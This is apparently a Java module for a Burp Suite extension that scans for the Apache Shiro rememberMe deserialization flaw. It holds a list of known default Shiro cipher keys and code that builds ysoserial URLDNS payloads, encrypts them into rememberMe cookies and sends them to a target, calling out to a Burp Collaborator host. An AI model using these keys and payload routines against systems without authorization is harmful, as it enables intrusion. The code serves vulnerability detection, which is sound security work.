package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import sun.misc.BASE64Decoder;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

import java.io.PrintWriter;
import java.net.URL;
import java.util.*;

/**
 * 
 * @author wangmeng
 * @git https://github.com/bigsizeme
 *
 */

public class ShiroDesAll implements IModule {
	
	public static String ENCODING_UTF8 = "UTF-8";
	public static String ENCODING_GBK = "GBK";
	public static String ENCODING_GB2312 = "GB2312";
	
//	public static String payload = null;

//	private static LinkedHashSet hs = new LinkedHashSet();
//	private  String SHIRO_DESERIALIZATION = new String("Apache Shiro Deserializatio vulnerability 更新到 新版本，注意1.5.2有越权绕过问题".getBytes(ENCODING_UTF8),ENCODING_UTF8);
	private static final String SHIRO_DESERIALIZATION = "Apache Shiro Deserialization vulnerability ";
	
	
	
	private static final String DESCRIPTION_SHIRO_DESERIALIZATION ="Apache Shiro before 1.2.5, "
			+ "when a cipher key has not been configured for the remember me feature, "
			+ "allows remote attackers to execute arbitrary "
			+ "code or bypass intended access restrictions via an unspecified request parameter "
			+ "author  wangmeng  github: https://github.com/bigsizeme";
	
	private static final String REMEDY ="Update to the new version, please note that there is an unauthorized bypass before version 1.5.2 ";
	
	 private PrintWriter stderr;
	 
//	 private static List<IScanIssue> issues = new ArrayList<>();
	 
	 private String[] keys = {
			 "4AvVhmFLUs0KTA3Kprsdag==",
             "3AvVhmFLUs0KTA3Kprsdag==",
             "2AvVhdsgUs0FSA3SDFAdag==",
             "6ZmI6I2j5Y+R5aSn5ZOlAA==",
             "wGiHplamyXlVB11UXWol8g==",
             "cmVtZW1iZXJNZQAAAAAAAA==",
             "Z3VucwAAAAAAAAAAAAAAAA==",
             "ZnJlc2h6Y24xMjM0NTY3OA==",
             "L7RioUULEFhRyxM7a2R/Yg==",
             "RVZBTk5JR0hUTFlfV0FPVQ==",
             "fCq+/xW488hMTCD+cmJ3aQ==",
	                                  "WkhBTkdYSUFPSEVJX0NBVA==",
	                                  "1QWLxg+NYmxraMoxAXu/Iw==",
	                                  "WcfHGU25gNnTxTlmJMeSpw==",
	                                  "a2VlcE9uR29pbmdBbmRGaQ==",
	                                  "bWluZS1hc3NldC1rZXk6QQ==",
	                                  "5aaC5qKm5oqA5pyvAAAAAA==",
	                                  "kPH+bIxk5D2deZiIxcaaaA==",
	                                  "r0e3c16IdVkouZgk1TKVMg==",
	                                  "ZUdsaGJuSmxibVI2ZHc9PQ==",
	                                  "U3ByaW5nQmxhZGUAAAAAAA==",
	                                  "LEGEND-CAMPUS-CIPHERKEY=="};
	 

//	 List<String> keyList = Arrays.asList(keys);
	@Override
	public synchronized   List<IScanIssue> scan(IBurpExtenderCallbacks callbacks,IHttpRequestResponse baseRequestResponse,
			IScannerInsertionPoint insertionPoint) {
		 stderr = new PrintWriter(callbacks.getStderr(), true);
		 stderr.println("-------------------------------------开始扫描--------------------------------------");

		
//		 List<IScanIssue> issues = new ArrayList<>();
		 
		 IExtensionHelpers helpers = callbacks.getHelpers();

        List<IScanIssue> issues = new ArrayList<>();
	     IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
	     URL url = reqInfo.getUrl();
	     List<String> headers = reqInfo.getHeaders();
//	     headers.removeIf(header -> header != null && header.toLowerCase().startsWith("cookie:"));	
	     List<IParameter>parameters = reqInfo.getParameters();
	     byte[] rawrequest = baseRequestResponse.getRequest();
	     for (IParameter param : parameters) {
	            rawrequest = callbacks.getHelpers().removeParameter(rawrequest, param);
	        }

	     IBurpCollaboratorClientContext context = callbacks.createBurpCollaboratorClientContext();
//	     String dnslog =  context.getCollaboratorServerLocation();
	     String payload  = context.generatePayload(true);
//	     if(payload == null ||"".equals(payload)){
//			payload = context.generatePayload(true);
//			stderr.println("[!] 生成dnslog: "+payload);
//			}
//	     System.out.println("生成dnslog: "+payload);
	     String payloadType = "URLDNS";
//	     stderr.println("[!] 生成dnslog: "+payload);
	     
			
	     	for(String base64key : keys){

                IScanIssue tempIssue = getResultWithKey(base64key,callbacks,payload,headers,baseRequestResponse,context);
//	     		stderr.println("[!] issues size : "+issues.size());
	     		stderr.println("-------------------------------------------ffffff----------------");
	     		if(tempIssue!=null){
	     			stderr.println("-------------------------------------------hello----------------");
                    issues.add(tempIssue);
	     			return issues;
	     		}
	     	}

		
		return issues;
	}

    private   IScanIssue   getResultWithKey(String base64Key,IBurpExtenderCallbacks callbacks,String payload,List<String> headers,IHttpRequestResponse baseRequestResponse,IBurpCollaboratorClientContext context ){
    	 String payloadType = "URLDNS";
    	 IExtensionHelpers helpers = callbacks.getHelpers();
    	 IHttpRequestResponse checkRequestResponse = null;
        IScanIssue tempIssue = null;
    	final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
//    	 List<IScanIssue> issues = new ArrayList<>();
		try {
			final ObjectPayload objectPayloadpayload = payloadClass.newInstance();
			final Object object = objectPayloadpayload.getObject("http://"+payload);
			
//			final Object object = objectPayloadpayload.getObject("http://tqnhnhjdlajzwuk0yn7t17kfo6uwil.burpcollaborator.net");
			Optional<byte[]> bbs = ByteArrayUtils.objectToBytes(object);
//			String base64Key = "kPH+bIxk5D2deZiIxcaaaA==";
			byte[] key = new BASE64Decoder().decodeBuffer(base64Key);
			String rememberMe = AES.EncryptByte(bbs.get(), key);
			headers.removeIf(header -> header != null && header.toLowerCase().startsWith("cookie:"));	
			rememberMe = rememberMe.replaceAll("\r|\n", "");
			headers.add("Cookie: rememberMe="+rememberMe);
			
			
			byte[] modifiedRawRequest = helpers.buildHttpMessage(headers, null);
		     String request = helpers.bytesToString(modifiedRawRequest);
		     stderr.println("[!] 当前使用秘钥 : "+base64Key);
		     stderr.println("[!] 生成request:\n "+request);
		     checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRawRequest);
		     byte[] bresponse= checkRequestResponse.getResponse();
		     String resp = helpers.bytesToString(bresponse);
		     stderr.println("[!] 生成resp:\n "+resp);
//		     IBurpCollaboratorClientContext context = callbacks.createBurpCollaboratorClientContext();
		     List<IBurpCollaboratorInteraction> collaboratorInteractions = context.fetchCollaboratorInteractionsFor(payload);
		     if (checkRequestResponse != null && checkRequestResponse.getResponse() != null
	        		 && collaboratorInteractions != null&& !collaboratorInteractions.isEmpty()){
				 stderr.println("[!] collaboratorInteractions size:  "+collaboratorInteractions.size());


                 tempIssue = new CustomScanIssue(checkRequestResponse.getHttpService(),
	        			   	  helpers.analyzeRequest(checkRequestResponse).getUrl(),
	        			   	 new CustomHttpRequestResponse(modifiedRawRequest, checkRequestResponse.getResponse(), baseRequestResponse.getHttpService()),
	        			   	SHIRO_DESERIALIZATION, DESCRIPTION_SHIRO_DESERIALIZATION, REMEDY,  Risk.High, Confidence.Firm
	                        );
//		    	 for(IBurpCollaboratorInteraction aa:collaboratorInteractions){
//		    		Map<String,String> maps =  aa.getProperties();
//		    		maps.forEach((k,v)->{
//		    			  stderr.println("[!] key: "+k+" value: "+v);
//		    		});
				 stderr.println("[!] ----------------------发现问题:-----------------------------------  ");
                return  tempIssue;
		     }
		     

		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
		}
	  
    	
    	
    	return tempIssue;
    }
	
	


}
